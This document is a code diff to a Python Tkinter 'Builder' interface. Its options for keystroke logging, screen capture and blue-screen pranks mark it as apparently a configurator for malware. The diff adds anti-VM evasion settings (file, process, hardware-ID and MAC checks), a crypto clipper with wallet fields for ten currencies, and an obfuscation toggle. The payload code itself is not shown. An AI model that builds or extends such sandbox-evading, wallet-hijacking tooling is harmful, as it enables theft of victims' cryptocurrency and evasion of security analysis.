@@ -3,6 +3,7 @@ from tkinter import ttk
 import random
 import os
 import pyperclip
+import time
 import json
 import tkinter.font as tkFont
 from PIL import Image, ImageTk, ImageFont
@@ -59,6 +60,25 @@ class Builder:
                 'jmpscar': True,
                 'keystrk': True,
                 'scrnman': True
+            },
+            'anti_vm': {
+                'enabled': True,
+                'FilesCheck': True,
+                'ProcessesCheck': True,
+                'HardwareIDsCheck': True,
+                'MacAddressesCheck': True
+            },
+            'crypto_clipper': {
+                'BTC': '',
+                'ETH': '',
+                'DOGE': '',
+                'LTC': '',
+                'XMR': '',
+                'BCH': '',
+                'DASH': '',
+                'TRX': '',
+                'XRP': '',
+                'XLM': ''
             }
         }
 
@@ -66,7 +86,7 @@ class Builder:
 
     def new_background(self, demand=None):
         self.canvas.delete('all')
-        selected_background = random.randint(1, len(os.listdir("resources/assets/builder_backgrounds")))
+        selected_background = random.randint(1, len(os.listdir('resources/assets/builder_backgrounds')))
         if demand != None: selected_background = demand
         self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
         self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
@@ -593,6 +613,21 @@ class Builder:
         self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')
 
+    def advanced_settings(self, context):
+        if time.time() - self.time_check < 0.5:
+            advanced_settings = tk.Tk()
+            if context == 'antivm':
+                advanced_settings.geometry('300x200')
+                advanced_settings.title('Anti-VM Advanced Settings')
+
+
+
+            advanced_settings.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
+            advanced_settings.mainloop()
+
+
+        self.time_check = time.time()
+        print('asd')
 
 
     def compiling_settings(self):
@@ -603,7 +638,42 @@ class Builder:
         self.compiling_settings_button['state'] = tk.DISABLED
         self.compiling_settings_button['relief'] = 'flat'
         self.new_background(3)
-        self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')
+        #self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')
+
+        self.time_check = time.time()
+        
+        self.cbvar_obfuscation = tk.BooleanVar(value=True)
+        self.cb_obfuscation = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='obfuscation',
+            font=('Consolas', 14),
+            variable=self.cbvar_obfuscation,
+            onvalue=True,
+            offvalue=False
+        )
+        self.cb_obfuscation.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keylogr']))
+        self.cb_obfuscation.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(100, 125, window=self.cb_obfuscation, anchor='w')
+
+        self.cbvar_antivm = tk.BooleanVar(value=True)
+        self.cb_antivm = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='anti-VM',
+            font=('Consolas', 14),
+            variable=self.cbvar_antivm,
+            command=lambda: self.advanced_settings('antivm'),
+            onvalue=True,
+            offvalue=False
+        )
+        self.cb_antivm.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keylogr']))
+        self.cb_antivm.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(100, 165, window=self.cb_antivm, anchor='w')
+
+
+
+
 
         # Icon
         # Anti-VM   /w advanced options
